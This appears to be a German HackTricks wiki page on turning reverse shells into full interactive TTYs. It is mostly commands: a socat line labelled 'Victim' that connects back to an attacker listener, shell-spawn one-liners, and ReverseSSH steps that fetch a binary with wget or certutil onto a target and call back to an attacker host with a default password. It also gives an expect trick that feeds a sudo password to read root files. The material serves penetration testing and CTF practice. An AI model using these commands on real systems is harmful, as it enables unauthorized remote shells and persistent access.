# Vollständige TTYs

{{#include ../../banners/hacktricks-training.md}}

## Vollständige TTY

Beachte, dass die in der Variable `SHELL` gesetzte shell **innerhalb von** _**/etc/shells**_ **aufgelistet** sein muss, andernfalls erscheint `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Beachte außerdem, dass die folgenden snippets nur in bash funktionieren. Wenn du dich in einer zsh befindest, wechsle zu bash, bevor du die shell erhältst, indem du `bash` ausführst.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!TIP]
> Du kannst die **Anzahl** der **Zeilen** und **Spalten** durch Ausführen von **`stty -a`** ermitteln.

#### Skript
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Eine praktische Möglichkeit für **interaktiven Shell-Zugriff** sowie **Dateiübertragungen** und **port forwarding** besteht darin, den statisch gelinkten SSH-Server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) auf dem Zielsystem abzulegen.<sup>[[1]](#references)</sup>

Unten sehen Sie ein Beispiel für `x86` mit UPX-komprimierten Binaries. Für andere Binaries siehe [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Lokal vorbereiten, um die Anfrage zur SSH-Portweiterleitung abzufangen:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux-Ziel:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows-10-Zielsystem (für frühere Versionen siehe [Projekt-README](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Wenn die ReverseSSH-Portweiterleitungsanfrage erfolgreich war, solltest du dich nun mit dem Standardpasswort `letmeinbrudipls` im Kontext des Benutzers anmelden können, der `reverse-ssh(.exe)` ausführt:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) aktualisiert Linux reverse shells automatisch auf TTY, verwaltet die Größe des Terminals, protokolliert alles und vieles mehr. Außerdem bietet es readline support für Windows shells.<sup>[[2]](#references)</sup>

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## Keine TTY

Wenn du aus irgendeinem Grund keine vollständige TTY erhalten kannst, **kannst du trotzdem mit Programmen interagieren**, die Benutzereingaben erwarten. Im folgenden Beispiel wird das Passwort an `sudo` übergeben, um eine Datei zu lesen:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## Referenzen

- [1] [ReverseSSH - Statisch gelinkter ssh server mit reverse shell functionality für CTFs und Ähnliches](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Shell handler, der einige Dinge automatisiert, um das Leben einfacher zu machen](https://github.com/brightio/penelope)

{{#include ../../banners/hacktricks-training.md}}
